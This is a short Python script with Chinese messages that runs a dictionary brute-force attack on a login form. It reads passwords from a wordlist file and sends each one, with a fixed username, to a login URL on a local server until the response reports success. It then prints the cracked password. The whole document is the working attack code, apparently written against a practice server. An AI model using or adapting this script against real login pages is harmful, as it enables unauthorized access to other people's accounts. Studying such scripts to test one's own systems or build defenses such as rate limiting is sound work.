import urllib
import urllib.request

file1=open("pass.text")
while 1:
    pwd = file1.readline().strip()
    if not pwd:
        print('字典已比对完。')
        break

    data = {}

    data['passworld'] = pwd
    data['username'] = 'w123'

    url_parame = urllib.parse.urlencode(data)

    url = "http://127.0.0.1:5000/user/login?"

    all_url = url + url_parame

    data = urllib.request.urlopen(all_url).read()

    record = data.decode('UTF-8')

    if record == 'ok':
        print('破解出来了，密码为',pwd)
        break
    else:
        print('error')